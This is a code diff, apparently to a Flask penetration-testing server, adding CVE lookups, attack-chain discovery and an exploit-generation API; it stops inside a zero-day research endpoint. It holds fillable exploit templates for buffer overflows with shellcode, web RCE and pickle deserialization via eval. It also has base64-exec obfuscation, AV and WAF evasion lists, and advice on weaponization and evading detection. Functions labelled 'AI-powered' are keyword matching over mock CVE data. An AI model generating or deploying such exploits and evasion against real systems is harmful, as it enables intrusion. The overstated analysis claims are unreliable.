@@ -10,6 +10,7 @@ import threading
 import time
 import hashlib
 import pickle
+import base64
 from datetime import datetime, timedelta
 from typing import Dict, Any, Optional
 from collections import OrderedDict
@@ -20,6 +21,7 @@ from pathlib import Path
 from flask import Flask, request, jsonify
 import psutil
 import signal
+import requests
 
 # ============================================================================
 # PROCESS MANAGEMENT FOR COMMAND TERMINATION (v5.0 ENHANCEMENT)
@@ -590,6 +592,633 @@ class PythonEnvironmentManager:
 
 # Global environment manager
 env_manager = PythonEnvironmentManager()
+
+# ============================================================================
+# ADVANCED VULNERABILITY INTELLIGENCE SYSTEM (v6.0 ENHANCEMENT)
+# ============================================================================
+
+class CVEIntelligenceManager:
+    """CVE database integration and real-time vulnerability monitoring"""
+    
+    def __init__(self):
+        self.nvd_api_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
+        self.exploitdb_api_url = "https://gitlab.com/exploit-database/exploitdb/-/raw/main/files_exploits.csv"
+        self.github_api_url = "https://api.github.com/search/repositories"
+        self.cache_ttl = 3600  # 1 hour cache for CVE data
+        
+    def fetch_latest_cves(self, hours=24, severity_filter="HIGH,CRITICAL"):
+        """Fetch latest CVEs from NVD with filtering"""
+        try:
+            from datetime import datetime, timedelta
+            import requests
+            
+            # Calculate time range
+            end_time = datetime.now()
+            start_time = end_time - timedelta(hours=hours)
+            
+            # Format dates for NVD API
+            start_date = start_time.strftime("%Y-%m-%dT%H:%M:%S.000")
+            end_date = end_time.strftime("%Y-%m-%dT%H:%M:%S.000")
+            
+            params = {
+                "pubStartDate": start_date,
+                "pubEndDate": end_date,
+                "resultsPerPage": 100
+            }
+            
+            response = requests.get(self.nvd_api_url, params=params, timeout=30)
+            response.raise_for_status()
+            
+            cve_data = response.json()
+            vulnerabilities = cve_data.get("vulnerabilities", [])
+            
+            # Filter by severity
+            severity_levels = [s.strip() for s in severity_filter.split(",")]
+            filtered_cves = []
+            
+            for vuln in vulnerabilities:
+                cve_item = vuln.get("cve", {})
+                metrics = cve_item.get("metrics", {})
+                
+                # Extract CVSS score
+                cvss_score = 0.0
+                severity = "UNKNOWN"
+                
+                if "cvssMetricV31" in metrics:
+                    cvss_data = metrics["cvssMetricV31"][0]["cvssData"]
+                    cvss_score = cvss_data.get("baseScore", 0.0)
+                    severity = cvss_data.get("baseSeverity", "UNKNOWN")
+                elif "cvssMetricV30" in metrics:
+                    cvss_data = metrics["cvssMetricV30"][0]["cvssData"]
+                    cvss_score = cvss_data.get("baseScore", 0.0)
+                    severity = cvss_data.get("baseSeverity", "UNKNOWN")
+                
+                if severity in severity_levels or "ALL" in severity_levels:
+                    filtered_cves.append({
+                        "cve_id": cve_item.get("id", ""),
+                        "description": cve_item.get("descriptions", [{}])[0].get("value", ""),
+                        "cvss_score": cvss_score,
+                        "severity": severity,
+                        "published_date": cve_item.get("published", ""),
+                        "last_modified": cve_item.get("lastModified", ""),
+                        "references": [ref.get("url", "") for ref in cve_item.get("references", [])]
+                    })
+            
+            return {
+                "success": True,
+                "total_cves": len(filtered_cves),
+                "cves": filtered_cves,
+                "timeframe": f"{hours} hours",
+                "severity_filter": severity_filter
+            }
+            
+        except Exception as e:
+            logger.error(f"Error fetching CVEs: {str(e)}")
+            return {
+                "success": False,
+                "error": str(e),
+                "cves": []
+            }
+    
+    def analyze_cve_exploitability(self, cve_id):
+        """AI-powered analysis of CVE exploitability"""
+        try:
+            # Fetch CVE details
+            cve_url = f"{self.nvd_api_url}?cveId={cve_id}"
+            response = requests.get(cve_url, timeout=30)
+            response.raise_for_status()
+            
+            cve_data = response.json()
+            if not cve_data.get("vulnerabilities"):
+                return {"success": False, "error": "CVE not found"}
+            
+            vuln = cve_data["vulnerabilities"][0]["cve"]
+            
+            # Analyze exploitability factors
+            exploitability_score = 0
+            factors = []
+            
+            # Check for remote exploitation
+            descriptions = vuln.get("descriptions", [])
+            desc_text = " ".join([d.get("value", "") for d in descriptions]).lower()
+            
+            if any(keyword in desc_text for keyword in ["remote", "network", "unauthenticated"]):
+                exploitability_score += 30
+                factors.append("Remote exploitation possible")
+            
+            if any(keyword in desc_text for keyword in ["code execution", "rce", "arbitrary code"]):
+                exploitability_score += 40
+                factors.append("Code execution vulnerability")
+            
+            if any(keyword in desc_text for keyword in ["buffer overflow", "heap overflow", "stack overflow"]):
+                exploitability_score += 25
+                factors.append("Memory corruption vulnerability")
+            
+            if any(keyword in desc_text for keyword in ["injection", "sql", "command", "script"]):
+                exploitability_score += 35
+                factors.append("Injection vulnerability")
+            
+            # Check CVSS metrics for exploitability
+            metrics = vuln.get("metrics", {})
+            if "cvssMetricV31" in metrics:
+                cvss = metrics["cvssMetricV31"][0]["cvssData"]
+                if cvss.get("attackVector") == "NETWORK":
+                    exploitability_score += 20
+                    factors.append("Network attack vector")
+                if cvss.get("attackComplexity") == "LOW":
+                    exploitability_score += 15
+                    factors.append("Low attack complexity")
+                if cvss.get("privilegesRequired") == "NONE":
+                    exploitability_score += 25
+                    factors.append("No privileges required")
+            
+            # Determine exploitability level
+            if exploitability_score >= 80:
+                level = "CRITICAL"
+            elif exploitability_score >= 60:
+                level = "HIGH"
+            elif exploitability_score >= 40:
+                level = "MEDIUM"
+            else:
+                level = "LOW"
+            
+            return {
+                "success": True,
+                "cve_id": cve_id,
+                "exploitability_score": exploitability_score,
+                "exploitability_level": level,
+                "factors": factors,
+                "recommendation": self._get_exploit_recommendation(level, factors)
+            }
+            
+        except Exception as e:
+            logger.error(f"Error analyzing CVE {cve_id}: {str(e)}")
+            return {"success": False, "error": str(e)}
+    
+    def _get_exploit_recommendation(self, level, factors):
+        """Get exploitation recommendation based on analysis"""
+        if level == "CRITICAL":
+            return "Immediate exploitation possible - High priority for red team testing"
+        elif level == "HIGH":
+            return "Likely exploitable - Good candidate for weaponization"
+        elif level == "MEDIUM":
+            return "Potentially exploitable - Requires further analysis"
+        else:
+            return "Low exploitation probability - Consider for information gathering"
+    
+    def search_existing_exploits(self, cve_id):
+        """Search for existing exploits across multiple sources"""
+        try:
+            results = {
+                "cve_id": cve_id,
+                "exploits_found": [],
+                "sources_checked": ["exploit-db", "github", "metasploit"]
+            }
+            
+            # Search GitHub for PoCs
+            try:
+                github_params = {
+                    "q": f"{cve_id} exploit proof concept poc",
+                    "type": "repositories",
+                    "sort": "updated"
+                }
+                
+                github_response = requests.get(self.github_api_url, params=github_params, timeout=15)
+                if github_response.status_code == 200:
+                    github_data = github_response.json()
+                    
+                    for repo in github_data.get("items", [])[:5]:  # Limit to top 5
+                        results["exploits_found"].append({
+                            "source": "github",
+                            "title": repo.get("name", ""),
+                            "url": repo.get("html_url", ""),
+                            "description": repo.get("description", ""),
+                            "stars": repo.get("stargazers_count", 0),
+                            "last_updated": repo.get("updated_at", "")
+                        })
+            except Exception as e:
+                logger.warning(f"GitHub search failed: {str(e)}")
+            
+            # Check local exploit database files (if available)
+            exploit_keywords = [cve_id.lower(), cve_id.replace("-", "")]
+            local_exploits = self._search_local_exploits(exploit_keywords)
+            results["exploits_found"].extend(local_exploits)
+            
+            return {
+                "success": True,
+                "results": results,
+                "total_exploits": len(results["exploits_found"])
+            }
+            
+        except Exception as e:
+            logger.error(f"Error searching exploits for {cve_id}: {str(e)}")
+            return {"success": False, "error": str(e)}
+    
+    def _search_local_exploits(self, keywords):
+        """Search local exploit database"""
+        # This would search local copies of exploit databases
+        # For now, return empty list - can be enhanced with local DB integration
+        return []
+
+class AIExploitGenerator:
+    """AI-powered exploit development and enhancement system"""
+    
+    def __init__(self):
+        # Extend existing payload templates
+        self.exploit_templates = {
+            "buffer_overflow": {
+                "x86": """
+# Buffer Overflow Exploit Template for {cve_id}
+# Target: {target_info}
+# Architecture: x86
+
+import struct
+import socket
+
+def create_exploit():
+    # Vulnerability details from {cve_id}
+    target_ip = "{target_ip}"
+    target_port = {target_port}
+    
+    # Buffer overflow payload
+    padding = "A" * {offset}
+    eip_control = struct.pack("<I", {ret_address})
+    nop_sled = "\\x90" * {nop_size}
+    
+    # Shellcode ({shellcode_type})
+    shellcode = {shellcode}
+    
+    exploit = padding + eip_control + nop_sled + shellcode
+    return exploit
+
+if __name__ == "__main__":
+    payload = create_exploit()
+    print(f"Exploit payload generated for {cve_id}")
+    print(f"Payload size: {{len(payload)}} bytes")
+                """,
+                "x64": """
+# 64-bit Buffer Overflow Exploit Template for {cve_id}
+# Target: {target_info}
+# Architecture: x64
+
+import struct
+import socket
+
+def create_exploit():
+    target_ip = "{target_ip}"
+    target_port = {target_port}
+    
+    # ROP chain for x64 exploitation
+    padding = "A" * {offset}
+    rop_chain = [
+        {rop_gadgets}
+    ]
+    
+    rop_payload = "".join([struct.pack("<Q", addr) for addr in rop_chain])
+    shellcode = {shellcode}
+    
+    exploit = padding + rop_payload + shellcode
+    return exploit
+                """
+            },
+            "web_rce": """
+# Web-based RCE Exploit for {cve_id}
+# Target: {target_info}
+
+import requests
+import sys
+
+def exploit_rce(target_url, command):
+    # CVE {cve_id} exploitation
+    headers = {{
+        "User-Agent": "Mozilla/5.0 (Compatible Exploit)",
+        "Content-Type": "{content_type}"
+    }}
+    
+    # Injection payload
+    payload = {injection_payload}
+    
+    try:
+        response = requests.post(target_url, data=payload, headers=headers, timeout=10)
+        if response.status_code == 200:
+            return response.text
+    except Exception as e:
+        print(f"Exploit failed: {{e}}")
+    
+    return None
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("Usage: python exploit.py <target_url> <command>")
+        sys.exit(1)
+    
+    result = exploit_rce(sys.argv[1], sys.argv[2])
+    if result:
+        print("Exploit successful!")
+        print(result)
+            """,
+            "deserialization": """
+# Deserialization Exploit for {cve_id}
+# Target: {target_info}
+
+import pickle
+import base64
+import requests
+
+class ExploitPayload:
+    def __reduce__(self):
+        return (eval, ('{command}',))
+
+def create_malicious_payload(command):
+    payload = ExploitPayload()
+    serialized = pickle.dumps(payload)
+    encoded = base64.b64encode(serialized).decode()
+    return encoded
+
+def send_exploit(target_url, command):
+    payload = create_malicious_payload(command)
+    
+    data = {{
+        "{parameter_name}": payload
+    }}
+    
+    response = requests.post(target_url, data=data)
+    return response.text
+            """
+        }
+        
+        self.evasion_techniques = {
+            "encoding": ["url", "base64", "hex", "unicode"],
+            "obfuscation": ["variable_renaming", "string_splitting", "comment_injection"],
+            "av_evasion": ["encryption", "packing", "metamorphism"],
+            "waf_bypass": ["case_variation", "parameter_pollution", "header_manipulation"]
+        }
+    
+    def generate_exploit_from_cve(self, cve_data, target_info):
+        """Generate working exploit from CVE data"""
+        try:
+            cve_id = cve_data.get("cve_id", "")
+            description = cve_data.get("description", "").lower()
+            
+            # Determine vulnerability type
+            vuln_type = self._classify_vulnerability(description)
+            exploit_template = self._select_template(vuln_type, target_info)
+            
+            # Generate exploit parameters
+            exploit_params = self._generate_exploit_parameters(cve_data, target_info, vuln_type)
+            
+            # Fill template with parameters
+            exploit_code = exploit_template.format(**exploit_params)
+            
+            # Apply evasion techniques if requested
+            if target_info.get("evasion_level", "none") != "none":
+                exploit_code = self._apply_evasion_techniques(exploit_code, target_info)
+            
+            return {
+                "success": True,
+                "cve_id": cve_id,
+                "vulnerability_type": vuln_type,
+                "exploit_code": exploit_code,
+                "parameters": exploit_params,
+                "instructions": self._generate_usage_instructions(vuln_type, exploit_params),
+                "evasion_applied": target_info.get("evasion_level", "none")
+            }
+            
+        except Exception as e:
+            logger.error(f"Error generating exploit: {str(e)}")
+            return {"success": False, "error": str(e)}
+    
+    def _classify_vulnerability(self, description):
+        """Classify vulnerability type from description"""
+        if any(keyword in description for keyword in ["buffer overflow", "heap overflow", "stack overflow"]):
+            return "buffer_overflow"
+        elif any(keyword in description for keyword in ["code execution", "command injection", "rce"]):
+            return "web_rce"
+        elif any(keyword in description for keyword in ["deserialization", "unserialize", "pickle"]):
+            return "deserialization"
+        elif any(keyword in description for keyword in ["sql injection", "sqli"]):
+            return "sql_injection"
+        elif any(keyword in description for keyword in ["xss", "cross-site scripting"]):
+            return "xss"
+        else:
+            return "generic"
+    
+    def _select_template(self, vuln_type, target_info):
+        """Select appropriate exploit template"""
+        if vuln_type == "buffer_overflow":
+            arch = target_info.get("target_arch", "x86")
+            return self.exploit_templates["buffer_overflow"].get(arch,
+                   self.exploit_templates["buffer_overflow"]["x86"])
+        elif vuln_type in self.exploit_templates:
+            return self.exploit_templates[vuln_type]
+        else:
+            return "# Generic exploit template for {cve_id}\n# Manual development required"
+    
+    def _generate_exploit_parameters(self, cve_data, target_info, vuln_type):
+        """Generate parameters for exploit template"""
+        params = {
+            "cve_id": cve_data.get("cve_id", ""),
+            "target_info": target_info.get("description", "Unknown target"),
+            "target_ip": target_info.get("target_ip", "192.168.1.100"),
+            "target_port": target_info.get("target_port", 80),
+            "command": target_info.get("command", "id"),
+        }
+        
+        if vuln_type == "buffer_overflow":
+            params.update({
+                "offset": target_info.get("offset", 268),
+                "ret_address": target_info.get("ret_address", "0x41414141"),
+                "nop_size": target_info.get("nop_size", 16),
+                "shellcode": target_info.get("shellcode", '"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"'),
+                "shellcode_type": target_info.get("shellcode_type", "linux/x86/exec"),
+                "rop_gadgets": target_info.get("rop_gadgets", "0x41414141, 0x42424242")
+            })
+        elif vuln_type == "web_rce":
+            params.update({
+                "content_type": target_info.get("content_type", "application/x-www-form-urlencoded"),
+                "injection_payload": target_info.get("injection_payload", '{"cmd": command}'),
+                "parameter_name": target_info.get("parameter_name", "data")
+            })
+        
+        return params
+    
+    def _apply_evasion_techniques(self, exploit_code, target_info):
+        """Apply evasion techniques to exploit code"""
+        evasion_level = target_info.get("evasion_level", "basic")
+        
+        if evasion_level == "basic":
+            # Simple string obfuscation
+            exploit_code = exploit_code.replace('"', "'")
+            exploit_code = f"# Obfuscated exploit\n{exploit_code}"
+        elif evasion_level == "advanced":
+            # Advanced obfuscation
+            exploit_code = self._advanced_obfuscation(exploit_code)
+        
+        return exploit_code
+    
+    def _advanced_obfuscation(self, code):
+        """Apply advanced obfuscation techniques"""
+        # This is a simplified version - real implementation would be more sophisticated
+        obfuscated = f"""
+# Advanced evasion techniques applied
+import base64
+exec(base64.b64decode('{base64.b64encode(code.encode()).decode()}'))
+        """
+        return obfuscated
+    
+    def _generate_usage_instructions(self, vuln_type, params):
+        """Generate usage instructions for the exploit"""
+        instructions = [
+            f"# Exploit for CVE {params['cve_id']}",
+            f"# Vulnerability Type: {vuln_type}",
+            "",
+            "## Usage Instructions:",
+            "1. Ensure target is vulnerable to this CVE",
+            "2. Adjust target parameters as needed",
+            "3. Test in controlled environment first",
+            "4. Execute with appropriate permissions",
+            "",
+            "## Testing:",
+            f"python3 exploit.py {params.get('target_ip', '')} {params.get('target_port', '')}"
+        ]
+        
+        if vuln_type == "buffer_overflow":
+            instructions.extend([
+                "",
+                "## Buffer Overflow Notes:",
+                f"- Offset: {params.get('offset', 'Unknown')}",
+                f"- Return address: {params.get('ret_address', 'Unknown')}",
+                "- Verify addresses match target binary",
+                "- Disable ASLR for testing: echo 0 > /proc/sys/kernel/randomize_va_space"
+            ])
+        
+        return "\n".join(instructions)
+
+class VulnerabilityCorrelator:
+    """Correlate vulnerabilities for multi-stage attack chain discovery"""
+    
+    def __init__(self):
+        self.attack_patterns = {
+            "privilege_escalation": ["local", "kernel", "suid", "sudo"],
+            "remote_execution": ["remote", "network", "rce", "code execution"],
+            "persistence": ["service", "registry", "scheduled", "startup"],
+            "lateral_movement": ["smb", "wmi", "ssh", "rdp"],
+            "data_exfiltration": ["file", "database", "memory", "network"]
+        }
+        
+        self.software_relationships = {
+            "windows": ["iis", "office", "exchange", "sharepoint"],
+            "linux": ["apache", "nginx", "mysql", "postgresql"],
+            "web": ["php", "nodejs", "python", "java"],
+            "database": ["mysql", "postgresql", "oracle", "mssql"]
+        }
+    
+    def find_attack_chains(self, target_software, max_depth=3):
+        """Find multi-vulnerability attack chains"""
+        try:
+            # This is a simplified implementation
+            # Real version would use graph algorithms and ML
+            
+            chains = []
+            
+            # Example attack chain discovery logic
+            base_software = target_software.lower()
+            
+            # Find initial access vulnerabilities
+            initial_vulns = self._find_vulnerabilities_by_pattern(base_software, "remote_execution")
+            
+            for initial_vuln in initial_vulns[:3]:  # Limit for demo
+                chain = {
+                    "chain_id": f"chain_{len(chains) + 1}",
+                    "target": target_software,
+                    "stages": [
+                        {
+                            "stage": 1,
+                            "objective": "Initial Access",
+                            "vulnerability": initial_vuln,
+                            "success_probability": 0.75
+                        }
+                    ],
+                    "overall_probability": 0.75,
+                    "complexity": "MEDIUM"
+                }
+                
+                # Find privilege escalation
+                priv_esc_vulns = self._find_vulnerabilities_by_pattern(base_software, "privilege_escalation")
+                if priv_esc_vulns:
+                    chain["stages"].append({
+                        "stage": 2,
+                        "objective": "Privilege Escalation",
+                        "vulnerability": priv_esc_vulns[0],
+                        "success_probability": 0.60
+                    })
+                    chain["overall_probability"] *= 0.60
+                
+                # Find persistence
+                persistence_vulns = self._find_vulnerabilities_by_pattern(base_software, "persistence")
+                if persistence_vulns and len(chain["stages"]) < max_depth:
+                    chain["stages"].append({
+                        "stage": 3,
+                        "objective": "Persistence",
+                        "vulnerability": persistence_vulns[0],
+                        "success_probability": 0.80
+                    })
+                    chain["overall_probability"] *= 0.80
+                
+                chains.append(chain)
+            
+            return {
+                "success": True,
+                "target_software": target_software,
+                "total_chains": len(chains),
+                "attack_chains": chains,
+                "recommendation": self._generate_chain_recommendations(chains)
+            }
+            
+        except Exception as e:
+            logger.error(f"Error finding attack chains: {str(e)}")
+            return {"success": False, "error": str(e)}
+    
+    def _find_vulnerabilities_by_pattern(self, software, pattern_type):
+        """Find vulnerabilities matching attack pattern"""
+        # Simplified mock data - real implementation would query CVE database
+        mock_vulnerabilities = [
+            {
+                "cve_id": "CVE-2024-1234",
+                "description": f"Remote code execution in {software}",
+                "cvss_score": 9.8,
+                "exploitability": "HIGH"
+            },
+            {
+                "cve_id": "CVE-2024-5678",
+                "description": f"Privilege escalation in {software}",
+                "cvss_score": 7.8,
+                "exploitability": "MEDIUM"
+            }
+        ]
+        
+        return mock_vulnerabilities
+    
+    def _generate_chain_recommendations(self, chains):
+        """Generate recommendations for attack chains"""
+        if not chains:
+            return "No viable attack chains found for target"
+        
+        recommendations = [
+            f"Found {len(chains)} potential attack chains",
+            f"Highest probability chain: {max(chains, key=lambda x: x['overall_probability'])['overall_probability']:.2%}",
+            "Recommendations:",
+            "- Test chains in order of probability",
+            "- Prepare fallback methods for each stage",
+            "- Consider detection evasion at each stage"
+        ]
+        
+        return "\n".join(recommendations)
+
+# Global intelligence managers
+cve_intelligence = CVEIntelligenceManager()
+exploit_generator = AIExploitGenerator()
+vulnerability_correlator = VulnerabilityCorrelator()
 
 def execute_command(command: str, use_cache: bool = True) -> Dict[str, Any]:
     """
@@ -3892,6 +4521,626 @@ def paramspider():
     except Exception as e:
         logger.error(f"💥 Error in paramspider endpoint: {str(e)}")
         return jsonify({
+            "error": f"Server error: {str(e)}"
+        }), 500
+
+# ============================================================================
+# ADVANCED VULNERABILITY INTELLIGENCE API ENDPOINTS (v6.0 ENHANCEMENT)
+# ============================================================================
+
+@app.route("/api/vuln-intel/cve-monitor", methods=["POST"])
+def cve_monitor():
+    """Monitor CVE databases for new vulnerabilities with AI analysis"""
+    try:
+        params = request.json
+        hours = params.get("hours", 24)
+        severity_filter = params.get("severity_filter", "HIGH,CRITICAL")
+        keywords = params.get("keywords", "")
+        
+        logger.info(f"🔍 Monitoring CVE feeds for last {hours} hours with severity filter: {severity_filter}")
+        
+        # Fetch latest CVEs
+        cve_results = cve_intelligence.fetch_latest_cves(hours, severity_filter)
+        
+        # Filter by keywords if provided
+        if keywords and cve_results.get("success"):
+            keyword_list = [k.strip().lower() for k in keywords.split(",")]
+            filtered_cves = []
+            
+            for cve in cve_results.get("cves", []):
+                description = cve.get("description", "").lower()
+                if any(keyword in description for keyword in keyword_list):
+                    filtered_cves.append(cve)
+            
+            cve_results["cves"] = filtered_cves
+            cve_results["filtered_by_keywords"] = keywords
+            cve_results["total_after_filter"] = len(filtered_cves)
+        
+        # Analyze exploitability for top CVEs
+        exploitability_analysis = []
+        for cve in cve_results.get("cves", [])[:5]:  # Analyze top 5 CVEs
+            cve_id = cve.get("cve_id", "")
+            if cve_id:
+                analysis = cve_intelligence.analyze_cve_exploitability(cve_id)
+                if analysis.get("success"):
+                    exploitability_analysis.append(analysis)
+        
+        result = {
+            "success": True,
+            "cve_monitoring": cve_results,
+            "exploitability_analysis": exploitability_analysis,
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        logger.info(f"📊 CVE monitoring completed | Found: {len(cve_results.get('cves', []))} CVEs")
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"💥 Error in CVE monitoring: {str(e)}")
+        return jsonify({
+            "success": False,
+            "error": f"Server error: {str(e)}"
+        }), 500
+
+@app.route("/api/vuln-intel/exploit-generate", methods=["POST"])
+def exploit_generate():
+    """Generate exploits from vulnerability data using AI"""
+    try:
+        params = request.json
+        cve_id = params.get("cve_id", "")
+        target_os = params.get("target_os", "")
+        target_arch = params.get("target_arch", "x64")
+        exploit_type = params.get("exploit_type", "poc")
+        evasion_level = params.get("evasion_level", "none")
+        
+        # Additional target context
+        target_info = {
+            "target_os": target_os,
+            "target_arch": target_arch,
+            "exploit_type": exploit_type,
+            "evasion_level": evasion_level,
+            "target_ip": params.get("target_ip", "192.168.1.100"),
+            "target_port": params.get("target_port", 80),
+            "description": params.get("target_description", f"Target for {cve_id}")
+        }
+        
+        if not cve_id:
+            logger.warning("🤖 Exploit generation called without CVE ID")
+            return jsonify({
+                "success": False,
+                "error": "CVE ID parameter is required"
+            }), 400
+        
+        logger.info(f"🤖 Generating exploit for {cve_id} | Target: {target_os} {target_arch}")
+        
+        # First analyze the CVE for context
+        cve_analysis = cve_intelligence.analyze_cve_exploitability(cve_id)
+        
+        if not cve_analysis.get("success"):
+            return jsonify({
+                "success": False,
+                "error": f"Failed to analyze CVE {cve_id}: {cve_analysis.get('error', 'Unknown error')}"
+            }), 400
+        
+        # Prepare CVE data for exploit generation
+        cve_data = {
+            "cve_id": cve_id,
+            "description": f"Vulnerability analysis for {cve_id}",
+            "exploitability_level": cve_analysis.get("exploitability_level", "UNKNOWN"),
+            "exploitability_score": cve_analysis.get("exploitability_score", 0)
+        }
+        
+        # Generate exploit
+        exploit_result = exploit_generator.generate_exploit_from_cve(cve_data, target_info)
+        
+        # Search for existing exploits for reference
+        existing_exploits = cve_intelligence.search_existing_exploits(cve_id)
+        
+        result = {
+            "success": True,
+            "cve_analysis": cve_analysis,
+            "exploit_generation": exploit_result,
+            "existing_exploits": existing_exploits,
+            "target_info": target_info,
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        logger.info(f"🎯 Exploit generation completed for {cve_id}")
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"💥 Error in exploit generation: {str(e)}")
+        return jsonify({
+            "success": False,
+            "error": f"Server error: {str(e)}"
+        }), 500
+
+@app.route("/api/vuln-intel/attack-chains", methods=["POST"])
+def discover_attack_chains():
+    """Discover multi-stage attack possibilities"""
+    try:
+        params = request.json
+        target_software = params.get("target_software", "")
+        attack_depth = params.get("attack_depth", 3)
+        include_zero_days = params.get("include_zero_days", False)
+        
+        if not target_software:
+            logger.warning("🔗 Attack chain discovery called without target software")
+            return jsonify({
+                "success": False,
+                "error": "Target software parameter is required"
+            }), 400
+        
+        logger.info(f"🔗 Discovering attack chains for {target_software} | Depth: {attack_depth}")
+        
+        # Discover attack chains
+        chain_results = vulnerability_correlator.find_attack_chains(target_software, attack_depth)
+        
+        # Enhance with exploit generation for viable chains
+        if chain_results.get("success") and chain_results.get("attack_chains"):
+            enhanced_chains = []
+            
+            for chain in chain_results["attack_chains"][:2]:  # Enhance top 2 chains
+                enhanced_chain = chain.copy()
+                enhanced_stages = []
+                
+                for stage in chain["stages"]:
+                    enhanced_stage = stage.copy()
+                    
+                    # Try to generate exploit for this stage
+                    vuln = stage.get("vulnerability", {})
+                    cve_id = vuln.get("cve_id", "")
+                    
+                    if cve_id:
+                        try:
+                            cve_data = {"cve_id": cve_id, "description": vuln.get("description", "")}
+                            target_info = {"target_os": "linux", "target_arch": "x64", "evasion_level": "basic"}
+                            
+                            exploit_result = exploit_generator.generate_exploit_from_cve(cve_data, target_info)
+                            enhanced_stage["exploit_available"] = exploit_result.get("success", False)
+                            
+                            if exploit_result.get("success"):
+                                enhanced_stage["exploit_code"] = exploit_result.get("exploit_code", "")[:500] + "..."
+                        except:
+                            enhanced_stage["exploit_available"] = False
+                    
+                    enhanced_stages.append(enhanced_stage)
+                
+                enhanced_chain["stages"] = enhanced_stages
+                enhanced_chains.append(enhanced_chain)
+            
+            chain_results["enhanced_chains"] = enhanced_chains
+        
+        result = {
+            "success": True,
+            "attack_chain_discovery": chain_results,
+            "parameters": {
+                "target_software": target_software,
+                "attack_depth": attack_depth,
+                "include_zero_days": include_zero_days
+            },
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        logger.info(f"🎯 Attack chain discovery completed | Found: {len(chain_results.get('attack_chains', []))} chains")
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"💥 Error in attack chain discovery: {str(e)}")
+        return jsonify({
+            "success": False,
+            "error": f"Server error: {str(e)}"
+        }), 500
+
+@app.route("/api/vuln-intel/threat-feeds", methods=["POST"])
+def threat_intelligence_feeds():
+    """Aggregate and correlate threat intelligence from multiple sources"""
+    try:
+        params = request.json
+        indicators = params.get("indicators", [])
+        timeframe = params.get("timeframe", "30d")
+        sources = params.get("sources", "all")
+        
+        if isinstance(indicators, str):
+            indicators = [i.strip() for i in indicators.split(",")]
+        
+        if not indicators:
+            logger.warning("🧠 Threat intelligence called without indicators")
+            return jsonify({
+                "success": False,
+                "error": "Indicators parameter is required"
+            }), 400
+        
+        logger.info(f"🧠 Correlating threat intelligence for {len(indicators)} indicators")
+        
+        correlation_results = {
+            "indicators_analyzed": indicators,
+            "timeframe": timeframe,
+            "sources": sources,
+            "correlations": [],
+            "threat_score": 0,
+            "recommendations": []
+        }
+        
+        # Analyze each indicator
+        cve_indicators = [i for i in indicators if i.startswith("CVE-")]
+        ip_indicators = [i for i in indicators if i.replace(".", "").isdigit()]
+        hash_indicators = [i for i in indicators if len(i) in [32, 40, 64] and all(c in "0123456789abcdef" for c in i.lower())]
+        
+        # Process CVE indicators
+        for cve_id in cve_indicators:
+            try:
+                cve_analysis = cve_intelligence.analyze_cve_exploitability(cve_id)
+                if cve_analysis.get("success"):
+                    correlation_results["correlations"].append({
+                        "indicator": cve_id,
+                        "type": "cve",
+                        "analysis": cve_analysis,
+                        "threat_level": cve_analysis.get("exploitability_level", "UNKNOWN")
+                    })
+                    
+                    # Add to threat score
+                    exploit_score = cve_analysis.get("exploitability_score", 0)
+                    correlation_results["threat_score"] += min(exploit_score, 100)
+                    
+                # Search for existing exploits
+                exploits = cve_intelligence.search_existing_exploits(cve_id)
+                if exploits.get("success") and exploits.get("total_exploits", 0) > 0:
+                    correlation_results["correlations"].append({
+                        "indicator": cve_id,
+                        "type": "exploit_availability",
+                        "exploits_found": exploits.get("total_exploits", 0),
+                        "threat_level": "HIGH"
+                    })
+                    correlation_results["threat_score"] += 25
+                    
+            except Exception as e:
+                logger.warning(f"Error analyzing CVE {cve_id}: {str(e)}")
+        
+        # Process IP indicators (basic reputation check simulation)
+        for ip in ip_indicators:
+            # Simulate threat intelligence lookup
+            correlation_results["correlations"].append({
+                "indicator": ip,
+                "type": "ip_reputation",
+                "analysis": {
+                    "reputation": "unknown",
+                    "geolocation": "unknown",
+                    "associated_threats": []
+                },
+                "threat_level": "MEDIUM"  # Default for unknown IPs
+            })
+        
+        # Process hash indicators
+        for hash_val in hash_indicators:
+            correlation_results["correlations"].append({
+                "indicator": hash_val,
+                "type": "file_hash",
+                "analysis": {
+                    "hash_type": f"hash{len(hash_val)}",
+                    "malware_family": "unknown",
+                    "detection_rate": "unknown"
+                },
+                "threat_level": "MEDIUM"
+            })
+        
+        # Calculate overall threat score and generate recommendations
+        total_indicators = len(indicators)
+        if total_indicators > 0:
+            correlation_results["threat_score"] = min(correlation_results["threat_score"] / total_indicators, 100)
+            
+            if correlation_results["threat_score"] >= 75:
+                correlation_results["recommendations"] = [
+                    "Immediate threat response required",
+                    "Block identified indicators",
+                    "Enhance monitoring for related IOCs",
+                    "Implement emergency patches for identified CVEs"
+                ]
+            elif correlation_results["threat_score"] >= 50:
+                correlation_results["recommendations"] = [
+                    "Elevated threat level detected",
+                    "Increase monitoring for identified indicators",
+                    "Plan patching for identified vulnerabilities",
+                    "Review security controls"
+                ]
+            else:
+                correlation_results["recommendations"] = [
+                    "Low to medium threat level",
+                    "Continue standard monitoring",
+                    "Plan routine patching",
+                    "Consider additional threat intelligence sources"
+                ]
+        
+        result = {
+            "success": True,
+            "threat_intelligence": correlation_results,
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        logger.info(f"🎯 Threat intelligence correlation completed | Threat Score: {correlation_results['threat_score']:.1f}")
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"💥 Error in threat intelligence: {str(e)}")
+        return jsonify({
+            "success": False,
+            "error": f"Server error: {str(e)}"
+        }), 500
+
+@app.route("/api/vuln-intel/zero-day-research", methods=["POST"])
+def zero_day_research():
+    """Automated zero-day vulnerability research using AI analysis"""
+    try:
+        params = request.json
+        target_software = params.get("target_software", "")
+        analysis_depth = params.get("analysis_depth", "standard")
+        source_code_url = params.get("source_code_url", "")
+        
+        if not target_software:
+            logger.warning("🔬 Zero-day research called without target software")
+            return jsonify({
+                "success": False,
+                "error": "Target software parameter is required"
+            }), 400
+        
